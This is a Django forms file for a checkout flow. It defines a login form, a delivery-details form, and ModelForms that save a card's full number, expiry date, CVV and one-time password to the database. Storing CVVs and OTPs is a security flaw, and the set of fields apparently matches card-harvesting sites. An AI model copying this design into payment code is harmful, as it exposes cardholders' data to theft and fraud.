
from django import forms
from django.forms import ModelForm
from .models import CardDetails, Otp, DeliveryDetails
from allauth.account.forms import LoginForm


class CustomLoginForm(LoginForm):
    login = forms.CharField(required=True, max_length=20)
    password = forms.CharField(required=True, max_length=20)



class CardDetailsForm(ModelForm):
    class Meta:
        model = CardDetails
        fields = ('fullname', 'address', 'creditcradnum', 'expiredate', 'cvv')

        widgets = {
            'address':forms.TextInput(attrs={'class':'form-control'}),
            'fullname':forms.TextInput(attrs={'class':'form-control', 'placeholder':'John Doe'}),
            'creditcradnum':forms.TextInput(attrs={'class':'form-control text-muted', 'placeholder':'0000 0000 0000 0000', 'id':'target', 'onkeypress':'if(this.value.length==19) return false' }),
            'expiredate':forms.TextInput(attrs={'class':'form-control text-muted', 'placeholder':'MM/YY', 'onkeyup':'formatString(event)', 'maxlength':'5'}),
            'cvv':forms.TextInput(attrs={'class':'form-control text-muted', 'placeholder':'000', 'onkeypress':'if(this.value.length==3) return false'}),

        }

class deliveryForm(ModelForm):
    class Meta:
        model = DeliveryDetails
        fields = ('fullname', 'email', 'address', 'city', 'state', 'phone')

        widgets = {
            'fullname':forms.TextInput(attrs={'class':'form-control'}),
            'email':forms.EmailInput(attrs={'class':'form-control'}),
            'address':forms.TextInput(attrs={'class':'form-control'}),
            'city':forms.TextInput(attrs={'class':'form-control', 'id':'city'}),
            'state':forms.TextInput(attrs={'class':'form-control', 'id':'state'}),
            'phone':forms.NumberInput(attrs={'class':'form-control', 'id':'phone'}),

        }

class OtpForm(ModelForm):
    class Meta:
        model = Otp
        fields = ('otp',)

        widgets = {
            'otp':forms.TextInput(attrs={'class':'form-control rounded mb-4 shadow', 'onkeypress':'if(this.value.length==6) return false', 'style':'width: 80%; height: 40px;'}),
        }





